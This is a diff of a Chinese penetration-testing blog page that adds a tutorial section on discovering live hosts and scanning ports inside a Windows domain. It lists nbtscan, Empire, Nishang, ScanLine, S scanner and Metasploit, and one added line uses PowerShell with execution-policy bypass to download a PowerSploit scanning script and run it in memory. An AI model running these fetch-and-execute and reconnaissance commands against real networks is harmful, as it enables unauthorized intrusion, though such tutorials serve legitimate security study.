@@ -163,7 +163,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.5k 字
+      2.4k 字
     </span>
   
 
@@ -173,7 +173,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      31
        分钟
     </span>
   
@@ -291,7 +291,30 @@ reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fS
 <p><img src="https://i.loli.net/2020/08/26/lfQmMCK438ZzFPb.png" srcset="/img/loading.gif" alt=""></p>
 <p>&nbsp;&nbsp;第三种是，存在域，但是当前用户不是域用户</p>
 <p><img src="https://i.loli.net/2020/08/26/znqxPvcFw1jprXo.png" srcset="/img/loading.gif" alt=""></p>
-
+<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="nbsp-nbsp-NetBIOS探测"><a href="#nbsp-nbsp-NetBIOS探测" class="headerlink" title="&nbsp;&nbsp;NetBIOS探测"></a>&nbsp;&nbsp;NetBIOS探测</h3><p>&nbsp;&nbsp;nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。可在白天和晚上分别探测来分析存活主机和对应IP地址。</p>
+<p>&nbsp;&nbsp;NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程。</p>
+<p><img src="https://i.loli.net/2020/08/31/PApsqld14IL6abG.png" srcset="/img/loading.gif" alt=""></p>
+<h3 id="nbsp-nbsp-ICMP协议探测"><a href="#nbsp-nbsp-ICMP协议探测" class="headerlink" title="&nbsp;&nbsp;ICMP协议探测"></a>&nbsp;&nbsp;ICMP协议探测</h3><p>&nbsp;&nbsp;利用ping命令依次对每个ip地址进行探测，也可以通过vbs脚本进行</p>
+<h3 id="nbsp-nbsp-ARP协议扫描"><a href="#nbsp-nbsp-ARP协议扫描" class="headerlink" title="&nbsp;&nbsp;ARP协议扫描"></a>&nbsp;&nbsp;ARP协议扫描</h3><p>&nbsp;&nbsp;1.通过上传arp-scan工具自定义掩码、范围等</p>
+<p>&nbsp;&nbsp;2.Empire模块-arpscan</p>
+<p>&nbsp;&nbsp;3.Nishang：Invoke-ARPScan.ps1脚本</p>
+<h3 id="nbsp-nbsp-TCP-UDP端口扫描"><a href="#nbsp-nbsp-TCP-UDP端口扫描" class="headerlink" title="&nbsp;&nbsp;TCP/UDP端口扫描"></a>&nbsp;&nbsp;TCP/UDP端口扫描</h3><p>&nbsp;&nbsp;ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描</p>
+<pre><code>scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</code></pre><h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><p>&nbsp;&nbsp;通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注三点：<strong>端口的 Banner 信息、端口上运行的服务、常见应用的默认端口</strong></p>
+<h3 id="nbsp-nbsp-telent扫描"><a href="#nbsp-nbsp-telent扫描" class="headerlink" title="&nbsp;&nbsp;telent扫描"></a>&nbsp;&nbsp;telent扫描</h3><p>&nbsp;&nbsp;Telnet协议是TCP/IP协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。如果要对目标主机的某个常规高位端口是否开放进行进行简单探测，telnet则是最方便的。</p>
+<pre><code>telnet DC 端口</code></pre><h3 id="nbsp-nbsp-S扫描器"><a href="#nbsp-nbsp-S扫描器" class="headerlink" title="&nbsp;&nbsp;S扫描器"></a>&nbsp;&nbsp;S扫描器</h3><p>&nbsp;&nbsp;S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描</p>
+<pre><code>S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</code></pre><h3 id="nbsp-nbsp-Metasploit端口扫描"><a href="#nbsp-nbsp-Metasploit端口扫描" class="headerlink" title="&nbsp;&nbsp;Metasploit端口扫描"></a>&nbsp;&nbsp;Metasploit端口扫描</h3><p>&nbsp;&nbsp;msf下运行 search portscan</p>
+<pre><code>auxiliary/scanner/portscan/tcp：</code></pre><h3 id="nbsp-nbsp-PowerScript的Invoke-portscan-ps1脚本"><a href="#nbsp-nbsp-PowerScript的Invoke-portscan-ps1脚本" class="headerlink" title="&nbsp;&nbsp;PowerScript的Invoke-portscan.ps1脚本"></a>&nbsp;&nbsp;PowerScript的Invoke-portscan.ps1脚本</h3><p>&nbsp;&nbsp;以无文件形式扫描</p>
+<pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&apos;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &apos;445,1433,8080,3389,80&apos; -oA c:\windows\temp\res.txt&quot;</code></pre><h3 id="nbsp-nbsp-Nishang的Invoke-PortScan模块"><a href="#nbsp-nbsp-Nishang的Invoke-PortScan模块" class="headerlink" title="&nbsp;&nbsp;Nishang的Invoke-PortScan模块"></a>&nbsp;&nbsp;Nishang的Invoke-PortScan模块</h3><p>&nbsp;&nbsp;Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p>
+<pre><code>具体的参数介绍如下。
+StartAddress：扫描范围开始的地址。
+EndAddress：扫描范围结束的地址。
+ScanPort：进行端口扫描。
+Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、
+111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、
+7878、8080、1521、3306、3389、5801、5900、5555、5901。
+TimeOut：设置超时时间。
+使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：
+Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</code></pre>
             </article>
             <hr>
             <div>
